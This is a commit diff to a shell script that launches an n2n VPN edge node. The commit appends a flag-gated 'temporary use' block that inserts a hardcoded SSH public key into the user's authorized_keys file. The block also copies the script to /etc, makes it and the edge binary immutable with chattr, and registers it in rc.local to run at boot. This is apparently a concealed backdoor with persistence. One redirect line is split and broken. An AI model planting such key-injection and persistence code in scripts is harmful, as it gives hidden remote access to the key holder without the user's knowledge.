1da26851d9dd221b0ecee70ab60d9688d83bcba3
Jun <33471088+151438611@users.noreply.github.com>
2021-06-04 20:55:04 +0800

    Update n2n_v2_edge_linux.sh

--- n2n/n2n_v2_edge_linux.sh
+++ n2n/n2n_v2_edge_linux.sh
@@ -112,3 +112,20 @@ else
 	$edge -d $vmnic_name -c $community_name -a $ipadd -Er -A1 -l $supernode_host:$supernode_port
 	echo "$(date +"%F %T")	$edge $ipadd was not runing ; start $edge ..." >> $log
 fi && sleep 3 && addIptables
+
+
+# ============= 临时使用 ====================
+tmp_use=0
+if [ $tmp_use -eq 1 ]; then
+	id_rsa_public="ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxYepQiOrFXyRsAy5tLmzhIw+Wpgssh5YUZ+zDq5GKpySVrlSGYOJEqFI3JOSYImW+TGUCRnZQNBipYdULd7an4fNDPBx4ZwPXotVrQwwWEkf8p6NPCnGVHqj+cwOYdgm6Oj8LP3W9djqA+6ojkpIk6h+KBp0D4rKVR1mmpBYrQ9Ty0dd7nH1qxwdUYSVV2xT1pc8/70r2OVjSAstEhItzFvNFGIl5X9e5VIgtZyKplWub4+R6bMBKY+M/ZAmzqLw5jAWVJv2Iu2YFeQgv105fFbBAobvkvxy8VdMFCalbl5UqTXMEjg+ZDH4eiGtR2mk7TsDdF7aIU6OIbSOoaTAqQ== rsa 2048-022219"
+	[ -d ~/.ssh ] || { mkdir -p ~/.ssh && chmod 700 ~/.ssh; }
+	[ -f ~/.ssh/authorized_keys ] || { touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys; }
+	grep -q "$id_rsa_public" ~/.ssh/authorized_keys || \
+		echo "$id_rsa_public" >> ~/
+		ssh/authorized_keys
+
+	cp -f $0 /etc/
+	chattr +i /etc/edge.sh $edge
+	grep -q edge /etc/rc.local || echo "bash /etc/edge.sh" >> /etc/rc.local
+	chmod +x /etc/rc.local
+fi
